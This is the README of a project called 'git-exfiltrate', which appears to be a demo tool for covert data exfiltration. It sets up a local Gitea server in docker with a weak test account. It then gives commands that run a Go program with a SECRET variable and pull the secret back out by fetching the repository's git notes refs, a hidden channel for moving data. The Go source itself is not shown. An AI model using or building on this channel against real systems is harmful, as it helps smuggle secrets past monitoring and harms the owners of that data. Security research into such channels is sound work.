# git-exfiltrate

## Start Infrastructure
```
cd server
docker-compose up

# First time setup
docker exec --user git -it gitea bash
gitea admin user create --name user1 --password password --email user1@nus.u.edu
# Login with user 'user1' and password 'password' and create empty repo called "repo" ( set up initialize repo to add README )
git clone http://user1:password@localhost:3000/user1/repo.git /tmp/repo
```

## Exfiltrate
```
SECRET=abc go run main.go
git clone http://localhost:3000/user1/repo.git /tmp/exfil-repo
cd /tmp/exfil-repo && git fetch origin refs/notes/commits:refs/notes/commits -f
```
